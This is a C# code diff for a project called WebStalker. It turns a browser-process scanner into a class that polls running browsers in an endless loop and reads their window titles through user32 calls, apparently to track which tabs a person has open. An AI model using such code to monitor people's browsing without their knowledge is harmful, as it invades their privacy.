@@ -4,17 +4,25 @@ using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace WebStalker
 {
-    public class Browser
+    public class Stalker
     {
         [DllImport("user32.dll")]
         static extern int GetWindowTextLength(IntPtr hWnd);
 
         [DllImport("user32.dll")]
         private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+
+        private int sleepTimeMs;
+
+        public Stalker(int checkIntervalMs)
+        {
+            sleepTimeMs = checkIntervalMs;
+        }
 
         readonly List<string> browserNames = new List<string>
         {
@@ -23,7 +31,7 @@ namespace WebStalker
             "iexplore",
             "safari",
             "opera",
-            "edge"
+            "msedge"
         };
         
 
@@ -35,16 +43,21 @@ namespace WebStalker
             return Process.GetProcessesByName(procName).Select(x => x.Id);
         }
 
-        public void StalkBrowser()
+        public void StalActiveBrowsersTabs()
         {
-            foreach (var browser in browserNames)
+            while (true)
             {
-                var spidsWorkers = GetBrowserProcessIds(browser);
-
-                foreach (var spid in spidsWorkers)
+                foreach (var browser in browserNames)
                 {
-                    StalkEach(spid, browser);
+                    var spidsWorkers = GetBrowserProcessIds(browser);
+
+                    foreach (var spid in spidsWorkers)
+                    {
+                        StalkEach(spid, browser);
+                    }
                 }
+
+                Thread.Sleep(sleepTimeMs);
             }
         }
 
